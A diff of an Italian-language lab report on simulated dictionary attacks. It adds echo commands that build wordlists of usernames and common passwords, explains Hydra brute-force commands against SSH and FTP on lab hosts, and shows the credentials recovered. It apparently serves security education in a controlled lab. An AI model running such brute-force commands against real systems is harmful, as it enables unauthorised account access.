@@ -71,12 +71,31 @@ Questa relazione documenta le fasi principali del lavoro svolto per simulare un 
   password123
   ```
 
+#### **Comando per Creare Liste**
+- Creazione della lista di password utilizzando il comando:
+  ```bash
+  echo -e "password\n123456\nadmin123\ntestpass\nqwerty\nletmein\npassword1\nwelcome\n12345678\nchangeme\nroot123\ntoor\niloveyou\nsecurepass\npassword123" > password.txt
+  ```
+  **Spiegazione del comando:**
+  - `echo -e`: Permette di interpretare i caratteri speciali come `\n` per andare a capo.
+  - Ogni stringa separata da `\n` rappresenta una nuova riga nel file.
+  - `>`: Reindirizza l'output al file `password.txt`.
+  - Questo comando genera un file di testo contenente le password da utilizzare nell'attacco a dizionario.
+
 #### **Attacco con Hydra**
 Comando utilizzato:
 ```bash
 hydra -L username.txt -P password.txt 192.168.50.100 -t 2 -V ssh
 ```
-Risultati:
+**Spiegazione del comando:**
+- `-L username.txt`: Specifica il file contenente la lista di username.
+- `-P password.txt`: Specifica il file contenente la lista di password.
+- `192.168.50.100`: Indica l'indirizzo IP del target.
+- `-t 2`: Imposta due thread per velocizzare l'attacco.
+- `-V`: Mostra i tentativi effettuati in tempo reale.
+- `ssh`: Specifica il servizio da attaccare.
+
+**Risultati:**
 - Hydra ha trovato le credenziali valide:
   ```
   Username: test_users
@@ -104,29 +123,40 @@ Risultati:
 4. Modifica del file di configurazione FTP (`/etc/vsftpd.conf`) per garantire che l'utente possa accedere.
 
 #### **Creazione delle Liste**
-- Lista di username (`ftp_usernames.txt`):
+- Creazione della lista di username:
+  ```bash
+  echo -e "ftp_user\nadmin\nroot\nguest\nuser1" > ftp_usernames.txt
   ```
-  ftp_user
-  admin
-  root
-  guest
-  user1
+  **Spiegazione del comando:**
+  - `echo -e`: Permette di interpretare i caratteri speciali come `\n` per andare a capo.
+  - Ogni stringa separata da `\n` rappresenta una nuova riga nel file.
+  - `>`: Reindirizza l'output al file `ftp_usernames.txt`.
+  - Questo comando genera un file di testo contenente i nomi utente da utilizzare nell'attacco a dizionario.
+
+- Creazione della lista di password:
+  ```bash
+  echo -e "123456\npassword\nftp_pass\nadmin123\nwelcome" > ftp_passwords.txt
   ```
-- Lista di password (`ftp_passwords.txt`):
-  ```
-  123456
-  password
-  ftp_pass
-  admin123
-  welcome
-  ```
+  **Spiegazione del comando:**
+  - `echo -e`: Permette di interpretare i caratteri speciali come `\n` per andare a capo.
+  - Ogni stringa separata da `\n` rappresenta una nuova riga nel file.
+  - `>`: Reindirizza l'output al file `ftp_passwords.txt`.
+  - Questo comando genera un file di testo contenente le password da utilizzare nell'attacco a dizionario.
 
 #### **Attacco con Hydra**
 Comando utilizzato:
 ```bash
 hydra -L ftp_usernames.txt -P ftp_passwords.txt 127.0.0.1 -t 1 -V ftp
 ```
-Risultati:
+**Spiegazione del comando:**
+- `-L ftp_usernames.txt`: Specifica il file contenente la lista di username.
+- `-P ftp_passwords.txt`: Specifica il file contenente la lista di password.
+- `127.0.0.1`: Indica il server FTP in locale.
+- `-t 1`: Utilizza un singolo thread per l'attacco.
+- `-V`: Mostra in tempo reale i tentativi effettuati.
+- `ftp`: Specifica il servizio da attaccare.
+
+**Risultati:**
 - Hydra ha trovato le credenziali valide:
   ```
   Username: ftp_user
@@ -148,3 +178,4 @@ Risultati:
 ---
 
 **Nota:** Le simulazioni sono state effettuate in un ambiente di laboratorio controllato per scopi educativi e non devono essere utilizzate per scopi non etici.
+
